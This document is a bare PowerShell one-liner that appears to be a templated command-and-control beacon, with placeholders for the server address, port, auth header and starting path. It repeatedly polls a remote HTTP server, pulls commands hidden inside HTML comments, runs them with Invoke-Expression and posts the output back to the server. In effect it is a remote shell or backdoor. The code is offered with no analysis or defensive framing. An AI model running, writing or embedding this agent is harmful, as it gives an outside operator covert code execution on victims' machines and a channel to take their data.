$ip="%ip%";$port="%port%";$auth="%auth%";$pool=(Invoke-RestMethod -Uri "http://${ip}:${port}/%startpool%" -Headers @{"Authorization"=$auth}).ToString();while($true){Start-Sleep -Milliseconds 750;$c=(Invoke-RestMethod -Uri "http://${ip}:${port}/${pool}" -Headers @{"Authorization"=$auth}).ToString();$b=[regex]::Match($c, '<!--(.*?)-->').Groups[1].Value.TrimStart('!');if($b.StartsWith('*')){$pool=$b.TrimStart('*')}else{$r=iex $b -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;Invoke-RestMethod -Uri "http://${ip}:${port}/${pool}" -Method Post -Headers @{"Authorization"=$auth} -Body ([System.Text.Encoding]::UTF8.GetBytes($r) -join ' ')}}